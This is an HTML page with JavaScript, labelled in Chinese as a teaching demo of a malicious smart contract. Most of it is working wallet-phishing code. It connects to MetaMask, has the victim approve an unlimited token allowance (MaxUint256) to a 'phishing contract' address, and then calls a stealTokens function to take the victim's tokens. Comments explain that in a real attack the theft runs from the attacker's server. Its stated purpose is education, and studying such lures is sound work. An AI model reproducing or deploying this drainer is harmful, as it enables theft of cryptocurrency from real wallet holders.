<div class="container">
    <h1>⚠️ 惡意合約教學示範 ⚠️</h1>
    <div class="warning-box">
        此頁面僅供學習和研究目的。<br>
        點擊下方按鈕將**模擬一個釣魚攻擊**。<br>

        <p>點擊下方按鈕以開始釣魚攻擊模擬。</p>
        <button id="phishingButton" class="button">啟動釣魚攻擊 (DEMO)</button>
    </div>
    
    <div style="margin-top: 2rem;">
        <p>請打開你的瀏覽器控制台 (Console) 來查看詳細步驟。</p>
    </div>
</div>

<script src="https://unpkg.com/ethers@6/dist/ethers.umd.min.js"></script>

<script>
    // 假設你已經部署了惡意合約和 mUSDT 代幣
    // 請將以下地址替換成你實際部署的合約地址

    // 惡意合約（Phishing Contract）地址
    const PHISHING_CONTRACT_ADDRESS = "0x5f1caa852a7232336406daf6b13b7f0ee56ace42"; 
    // 你部署的 mUSDT 代幣合約地址
    const MUSDT_CONTRACT_ADDRESS = "0xbd7ba6764f2b0a5cf4e3e1f74a0e925e4dd05e4b"; 

    // 惡意合約的 ABI，只需要包含 stealTokens 函數
    const phishingABI = [
        {
            "inputs": [
                { "internalType": "address", "name": "victim", "type": "address" },
                { "internalType": "uint256", "name": "amount", "type": "uint256" }
            ],
            "name": "stealTokens",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

    // mUSDT 代幣的 ABI，只需要包含 approve 函數
    const musdtABI = [
        {
            "inputs": [
                { "internalType": "address", "name": "spender", "type": "address" },
                { "internalType": "uint256", "name": "amount", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [
                { "internalType": "bool", "name": "", "type": "bool" }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

async function setupWeb3() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            // 步驟一：先請求授權來存取使用者的帳戶。
            await window.ethereum.request({ method: 'eth_requestAccounts' });

            // 步驟二：一旦授權被允許，現在才創建提供者。
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();

            return { provider, signer };
        } catch (error) {
            console.error("Failed to connect to wallet:", error);
            alert("連接錢包失敗。請檢查 MetaMask 或瀏覽器設定。");
            return null;
        }
    } else {
        alert("請安裝 MetaMask 錢包！");
        return null;
    }
}

  //... (前面的程式碼不變)
async function executePhishingAttack() {
    const web3 = await setupWeb3();
    if (!web3) return;

    try {
        const { signer } = web3; // 這個 signer 是 B 帳號

        // 步驟一：讓受害者 (B) 簽署授權交易
        const musdtContract = new ethers.Contract(MUSDT_CONTRACT_ADDRESS, musdtABI, signer);
        const amountToApprove = ethers.MaxUint256; 
        console.log("受害者 (B) 正在請求授權...請在錢包中確認！");
        const approveTx = await musdtContract.approve(PHISHING_CONTRACT_ADDRESS, amountToApprove);
        await approveTx.wait();
        console.log("授權成功！");

        // 步驟二：模擬攻擊者 (A) 的竊取操作
        // 注意：這裡的 signer 必須是攻擊者 (A) 的 signer
        // 在真實場景中，這段程式碼會在攻擊者自己的伺服器上執行，而不是在受害者瀏覽器上
        
        const victimAddress = await signer.getAddress(); // 獲取受害者 (B) 的地址
        
        // 為了模擬，你可以使用另一個 MetaMask 錢包來發送這筆交易
        // 或者你可以手動在 Remix 上連接 A 帳號，並呼叫 stealTokens 函數
        
        // 以下程式碼在當前 B 帳號的環境下會失敗，因為 B 不是 owner
        console.log("發送竊取代幣交易中...");
        const phishingContract = new ethers.Contract(PHISHING_CONTRACT_ADDRESS, phishingABI, signer);
        const amountToSteal = ethers.parseUnits("1000", 6);
        const stealTx = await phishingContract.stealTokens(victimAddress, amountToSteal);
        await stealTx.wait();
        console.log("竊取成功！");

    } catch (error) {
        console.error("發生錯誤:", error);
        alert("釣魚操作失敗。請檢查控制台。");
    }
}

    // 綁定到頁面上的按鈕
    document.getElementById('phishingButton').addEventListener('click', executePhishingAttack);
</script>

</body>
